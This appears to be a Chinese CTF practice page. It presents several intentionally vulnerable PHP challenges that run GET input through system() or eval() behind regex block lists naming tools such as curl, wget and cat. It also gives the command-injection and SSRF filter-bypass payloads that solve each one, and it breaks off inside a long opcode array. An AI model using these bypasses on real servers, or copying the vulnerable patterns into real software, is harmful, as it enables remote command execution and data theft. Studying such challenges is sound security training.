<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br>考点：敏感词汇过滤、敏感字符过滤<br><br>payload:<br>    ?c=tac&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br>    ?c=ta<span class="hljs-string">&#x27;&#x27;</span>c&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||  <span class="hljs-comment">// 适用于&#x27;tac&#x27;被过滤的情况</span><br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br>考点：敏感字符过滤、全数字过滤<br>解题思路：使用<span class="hljs-title function_ invoke__">get_defined_vars</span>(<span class="hljs-keyword">void</span>)替代变量；<br>    <span class="hljs-title function_ invoke__">get_defined_vars</span>(<span class="hljs-keyword">void</span>)：返回一个包含所有已定义变量列表的多维数组，可以替代任意变量，这些变量包括环境变量、服务器变量和用户定义的变量。<br><br>payload:<br>    ?c=<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>())));&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br>    ?c=<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>())));&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac%20flag.php&quot;</span>);<br><br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br>考点：高级敏感词汇过滤、空格过滤、全数字过滤<br>解题思路：通配符绕过、空格绕过<br><br>payload:<br>    ?c=/bin/ca?$&#123;IFS&#125;????.???<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br>考点：全字母过滤<br><br>payload1:  <span class="hljs-comment">// bash无字母命令执行</span><br>    ?c=$<span class="hljs-string">&#x27;\164\141\143&#x27;</span> $<span class="hljs-string">&#x27;\146\154\141\147\56\160\150\160&#x27;</span><br><br>payload2:  <span class="hljs-comment">// 访问&quot;/bin/base64 flag.php&quot;，编码flag.php</span><br>    ?c=/???/????<span class="hljs-number">64</span> ????.???<br>    执行后，页面回显base64编码后的flag.php；<br>注意：这个不是通用的,因为base64不是每个机器都有<br><br>payload3:  <span class="hljs-comment">// 访问&quot;/usr/bin/bzip2 flag.php&quot;，压缩flag.php</span><br>    ?c=/???/???/????<span class="hljs-number">2</span> ????.???<br>    执行后，访问url/flag.php.bz2即可下载压缩后的flag.php<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 还能炫的动吗？</span><br><span class="hljs-comment">//flag in 36.php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br>考点：全数字过滤、全字母过滤<br>解题思路：过滤了%，取反、异或、或不可用，使用$(())构造数字<br><br>payload:<br>    $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">#flag in http://192.168.7.68/flag</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$protocol</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$url</span>, <span class="hljs-number">0</span>,<span class="hljs-number">7</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$protocol</span>!=<span class="hljs-string">&#x27;http://&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;仅限http协议访问&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\.|\;|\||\&lt;|\&gt;|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\&#x27;|\&quot;|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0/&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;仅限域名地址访问&#x27;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;curl &#x27;</span>.<span class="hljs-variable">$url</span>);<br>&#125;<br><br>考点：点过滤<br><br>payload:<br>    ?url=http:<span class="hljs-comment">//192。168。7。68/flag</span><br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// RoarCTF2020-Web-badhack</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">info</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$opcode</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rax</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rbx</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tmp</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-variable">$stack</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-variable">$opcode</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">893</span>, <span class="hljs-number">192</span>, <span class="hljs-number">9</span>, <span class="hljs-number">966</span>, <span class="hljs-number">64</span>, <span class="hljs-number">129</span>, <span class="hljs-number">573</span>, <span class="hljs-number">129</span>, <span class="hljs-number">2</span>, <span class="hljs-number">454</span>, <span class="hljs-number">193</span>, <span class="hljs-number">66</span>, <span class="hljs-number">573</span>, <span class="hljs-number">130</span>, <span class="hljs-number">7</span>, <span class="hljs-number">710</span>, <span class="hljs-number">66</span>, <span class="hljs-number">131</span>, <span class="hljs-number">445</span>, <span class="hljs-number">131</span>, <span class="hljs-number">8</span>, <span class="hljs-number">966</span>, <span class="hljs-number">131</span>, <span class="hljs-number">4</span>, <span class="hljs-number">701</span>, <span class="hljs-number">68</span>, <span class="hljs-number">6</span>, <span class="hljs-number">710</span>, <span class="hljs-number">196</span>, <span class="hljs-number">69</span>, <span class="hljs-number">893</span>, <span class="hljs-number">133</span>, <span class="hljs-number">9</span>, <span class="hljs-number">966</span>, <span class="hljs-number">197</span>, <span class="hljs-number">6</span>, <span class="hljs-number">573</span>, <span class="hljs-number">6</span>, <span class="hljs-number">11</span>, <span class="hljs-number">710</span>, <span class="hljs-number">198</span>, <span class="hljs-number">199</span>, <span class="hljs-number">445</span>, <span class="hljs-number">71</span>, <span class="hljs-number">10</span>, <span class="hljs-number">966</span>, <span class="hljs-number">135</span>, <span class="hljs-number">136</span>, <span class="hljs-number">573</span>, <span class="hljs-number">200</span>, <span class="hljs-number">4</span>, <span class="hljs-number">454</span>, <span class="hljs-number">8</span>, <span class="hljs-number">137</span>, <span class="hljs-number">829</span>, <span class="hljs-number">137</span>, <span class="hljs-number">11</span>, <span class="hljs-number">198</span>, <span class="hljs-number">201</span>, <span class="hljs-number">10</span>, <span class="hljs-number">957</span>, <span class="hljs-number">138</span>, <span class="hljs-number">12</span>, <span class="hljs-number">710</span>, <span class="hljs-number">74</span>, <span class="hljs-number">11</span>, <span class="hljs-number">701</span>, <span class="hljs-number">203</span>, <span class="hljs-number">4</span>, <span class="hljs-number">710</span>, <span class="hljs-number">139</span>, <span class="hljs-number">76</span>, <span class="hljs-number">829</span>, <span class="hljs-number">76</span>, <span class="hljs-number">7</span>, <span class="hljs-number">454</span>, <span class="hljs-number">204</span>, <span class="hljs-number">205</span>, <span class="hljs-number">445</span>, <span class="hljs-number">141</span>, <span class="hljs-number">7</span>, <span class="hljs-number">454</span>, <span class="hljs-number">77</span>, <span class="hljs-number">78</span>, <span class="hljs-number">573</span>, <span class="hljs-number">142</span>, <span class="hljs-number">10</span>, <span class="hljs-number">966</span>, <span class="hljs-number">142</span>, <span class="hljs-number">79</span>, <span class="hljs-number">765</span>, <span class="hljs-number">207</span>, <span class="hljs-number">4</span>, <span class="hljs-number">454</span>, <span class="hljs-number">207</span>, <span class="hljs-number">208</span>, <span class="hljs-number">701</span>, <span class="hljs-number">16</span>, <span class="hljs-number">3</span>, <span class="hljs-number">454</span>, <span class="hljs-number">208</span>, <span class="hljs-number">145</span>, <span class="hljs-number">509</span>, <span class="hljs-number">17</span>, <span class="hljs-number">9</span>, <span class="hljs-number">454</span>, <span class="hljs-number">145</span>, <span class="hljs-number">146</span>, <span class="hljs-number">1021</span>, <span class="hljs-number">82</span>, <span class="hljs-number">4</span>, <span class="hljs-number">966</span>, <span class="hljs-number">82</span>, <span class="hljs-number">83</span>, <span class="hljs-number">765</span>, <span class="hljs-number">147</span>, <span class="hljs-number">6</span>, <span class="hljs-number">966</span>, <span class="hljs-number">147</span>, <span class="hljs-number">212</span>, <span class="hljs-number">829</span>, <span class="hljs-number">84</span>, <span class="hljs-number">3</span>, <span class="hljs-number">198</span>, <span class="hljs-number">148</span>, <span class="hljs-number">149</span>, <span class="hljs-number">957</span>, <span class="hljs-number">213</span>, <span class="hljs-number">12</span>, <span class="hljs-number">454</span>, <span class="hljs-number">149</span>, <span class="hljs-number">86</span>, <span class="hljs-number">765</span>, <span class="hljs-number">22</span>, <span class="hljs-number">11</span>, <span class="hljs-number">454</span>, <span class="hljs-number">214</span>, <span class="hljs-number">215</span>, <span class="hljs-number">637</span>, <span class="hljs-number">87</span>, <span class="hljs-number">13</span>, <span class="hljs-number">198</span>, <span class="hljs-number">215</span>, <span class="hljs-number">88</span>, <span class="hljs-number">893</span>, <span class="hljs-number">152</span>, <span class="hljs-number">4</span>, <span class="hljs-number">198</span>, <span class="hljs-number">216</span>, <span class="hljs-number">89</span>, <span class="hljs-number">445</span>, <span class="hljs-number">217</span>, <span class="hljs-number">10</span>, <span class="hljs-number">966</span>, <span class="hljs-number">153</span>, <span class="hljs-number">218</span>, <span class="hljs-number">317</span>, <span class="hljs-number">218</span>, <span class="hljs-number">7</span>, <span class="hljs-number">710</span>, <span class="hljs-number">154</span>, <span class="hljs-number">155</span>, <span class="hljs-number">701</span>, <span class="hljs-number">155</span>, <span class="hljs-number">7</span>, <span class="hljs-number">710</span>, <span class="hljs-number">155</span>, <span class="hljs-number">92</span>, <span class="hljs-number">701</span>, <span class="hljs-number">156</span>, <span class="hljs-number">2</span>, <span class="hljs-number">966</span>, <span class="hljs-number">220</span>, <span class="hljs-number">93</span>, <span class="hljs-number">381</span>, <span class="hljs-number">157</span>, <span class="hljs-number">6</span>, <span class="hljs-number">454</span>, <span class="hljs-number">157</span>, <span class="hljs-number">94</span>, <span class="hljs-number">573</span>, <span class="hljs-number">222</span>, <span class="hljs-number">6</span>, <span class="hljs-number">454</span>, <span class="hljs-number">158</span>, <span class="hljs-number">223</span>, <span class="hljs-number">637</span>, <span class="hljs-number">223</span>, <span class="hljs-number">12</span>, <span class="hljs-number">966</span>, <span class="hljs-number">95</span>, <span class="hljs-number">96</span>, <span class="hljs-number">317</span>, <span class="hljs-number">96</span>, <span class="hljs-number">9</span>, <span class="hljs-number">710</span>, <span class="hljs-number">160</span>, <span class="hljs-number">97</span>, <span class="hljs-number">893</span>, <span class="hljs-number">33</span>, <span class="hljs-number">14</span>, <span class="hljs-number">454</span>, <span class="hljs-number">161</span>, <span class="hljs-number">226</span>, <span class="hljs-number">765</span>, <span class="hljs-number">226</span>, <span class="hljs-number">7</span>, <span class="hljs-number">454</span>, <span class="hljs-number">98</span>, <span class="hljs-number">35</span>, <span class="hljs-number">381</span>, <span class="hljs-number">99</span>, <span class="hljs-number">8</span>, <span class="hljs-number">710</span>, <span class="hljs-number">99</span>, <span class="hljs-number">228</span>, <span class="hljs-number">317</span>, <span class="hljs-number">164</span>, <span class="hljs-number">11</span>, <span class="hljs-number">710</span>, <span class="hljs-number">228</span>, <span class="hljs-number">165</span>, <span class="hljs-number">253</span>, <span class="hljs-number">37</span>, <span class="hljs-number">13</span>, <span class="hljs-number">966</span>, <span class="hljs-number">229</span>, <span class="hljs-number">230</span>, <span class="hljs-number">253</span>, <span class="hljs-number">166</span>, <span class="hljs-number">14</span>, <span class="hljs-number">710</span>, <span class="hljs-number">38</span>, <span class="hljs-number">39</span>, <span class="hljs-number">1021</span>, <span class="hljs-number">167</span>, <span class="hljs-number">12</span>, <span class="hljs-number">966</span>, <span class="hljs-number">103</span>, <span class="hljs-number">168</span>, <span class="hljs-number">957</span>, <span class="hljs-number">40</span>, <span class="hljs-number">4</span>, <span class="hljs-number">710</span>, <span class="hljs-number">168</span>, <span class="hljs-number">105</span>, <span class="hljs-number">701</span>, <span class="hljs-number">105</span>, <span class="hljs-number">7</span>, <span class="hljs-number">966</span>, <span class="hljs-number">105</span>, <span class="hljs-number">128</span>, <span class="hljs-number">701</span>, <span class="hljs-number">128</span>, <span class="hljs-number">13</span>, <span class="hljs-number">454</span>, <span class="hljs-number">64</span>, <span class="hljs-number">193</span>, <span class="hljs-number">509</span>, <span class="hljs-number">65</span>, <span class="hljs-number">8</span>, <span class="hljs-number">966</span>, <span class="hljs-number">193</span>, <span class="hljs-number">66</span>, <span class="hljs-number">637</span>, <span class="hljs-number">130</span>, <span class="hljs-number">12</span>, <span class="hljs-number">966</span>, <span class="hljs-number">194</span>, <span class="hljs-number">67</span>, <span class="hljs-number">317</span>, <span class="hljs-number">3</span>, <span class="hljs-number">10</span>, <span class="hljs-number">710</span>, <span class="hljs-number">131</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1021</span>, <span class="hljs-number">68</span>, <span class="hljs-number">3</span>, <span class="hljs-number">966</span>, <span class="hljs-number">196</span>, <span class="hljs-number">133</span>, <span class="hljs-number">957</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">710</span>, <span class="hljs-number">197</span>, <span class="hljs-number">134</span>, <span class="hljs-number">957</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">966</span>, <span class="hljs-number">134</span>, <span class="hljs-number">71</span>, <span class="hljs-number">957</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">710</span>, <span class="hljs-number">135</span>, <span class="hljs-number">136</span>, <span class="hljs-number">253</span>, <span class="hljs-number">136</span>, <span class="hljs-number">13</span>, <span class="hljs-number">454</span>, <span class="hljs-number">72</span>, <span class="hljs-number">137</span>, <span class="hljs-number">637</span>, <span class="hljs-number">73</span>, <span class="hljs-number">11</span>, <span class="hljs-number">454</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">317</span>, <span class="hljs-number">202</span>, <span class="hljs-number">12</span>, <span class="hljs-number">710</span>, <span class="hljs-number">74</span>, <span class="hljs-number">11</span>, <span class="hljs-number">445</span>, <span class="hljs-number">139</span>, <span class="hljs-number">7</span>, <span class="hljs-number">966</span>, <span class="hljs-number">75</span>, <span class="hljs-number">204</span>, <span class="hljs-number">381</span>, <span class="hljs-number">204</span>, <span class="hljs-number">6</span>, <span class="hljs-number">454</span>, <span class="hljs-number">76</span>, <span class="hljs-number">205</span>, <span class="hljs-number">701</span>, <span class="hljs-number">77</span>, <span class="hljs-number">10</span>, <span class="hljs-number">198</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">573</span>, <span class="hljs-number">14</span>, <span class="hljs-number">8</span>, <span class="hljs-number">710</span>, <span class="hljs-number">78</span>, <span class="hljs-number">15</span>, <span class="hljs-number">253</span>, <span class="hljs-number">79</span>, <span class="hljs-number">9</span>, <span class="hljs-number">710</span>, <span class="hljs-number">143</span>, <span class="hljs-number">80</span>, <span class="hljs-number">957</span>, <span class="hljs-number">208</span>, <span class="hljs-number">13</span>, <span class="hljs-number">966</span>, <span class="hljs-number">16</span>, <span class="hljs-number">145</span>, <span class="hljs-number">253</span>, <span class="hljs-number">17</span>, <span class="hljs-number">8</span>, <span class="hljs-number">454</span>, <span class="hljs-number">81</span>, <span class="hljs-number">82</span>, <span class="hljs-number">445</span>, <span class="hljs-number">18</span>, <span class="hljs-number">5</span>, <span class="hljs-number">710</span>, <span class="hljs-number">210</span>, <span class="hljs-number">147</span>, <span class="hljs-number">573</span>, <span class="hljs-number">147</span>, <span class="hljs-number">10</span>, <span class="hljs-number">198</span>, <span class="hljs-number">147</span>, <span class="hljs-number">84</span>, <span class="hljs-number">957</span>, <span class="hljs-number">84</span>, <span class="hljs-number">7</span>, <span class="hljs-number">454</span>, <span class="hljs-number">148</span>, <span class="hljs-number">213</span>, <span class="hljs-number">445</span>, <span class="hljs-number">149</span>, <span class="hljs-number">13</span>, <span class="hljs-number">454</span>, <span class="hljs-number">21</span>, <span class="hljs-number">214</span>, <span class="hljs-number">573</span>, <span class="hljs-number">150</span>, <span class="hljs-number">4</span>, <span class="hljs-number">710</span>, <span class="hljs-number">86</span>, <span class="hljs-number">87</span>, <span class="hljs-number">701</span>, <span class="hljs-number">215</span>, <span class="hljs-number">13</span>, <span class="hljs-number">454</span>, <span class="hljs-number">215</span>, <span class="hljs-number">24</span>, <span class="hljs-number">317</span>, <span class="hljs-number">152</span>, <span class="hljs-number">2</span>, <span class="hljs-number">454</span>, <span class="hljs-number">216</span>, <span class="hljs-number">153</span>, <span class="hljs-number">637</span>, <span class="hljs-number">89</span>, <span class="hljs-number">12</span>, <span class="hljs-number">454</span>, <span class="hljs-number">153</span>, <span class="hljs-number">154</span>, <span class="hljs-number">829</span>, <span class="hljs-number">218</span>, <span class="hljs-number">10</span>, <span class="hljs-number">710</span>, <span class="hljs-number">90</span>, <span class="hljs-number">155</span>, <span class="hljs-number">957</span>, <span class="hljs-number">91</span>, <span class="hljs-number">12</span>, <span class="hljs-number">198</span>, <span class="hljs-number">27</span>, <span class="hljs-number">92</span>, <span class="hljs-number">893</span>, <span 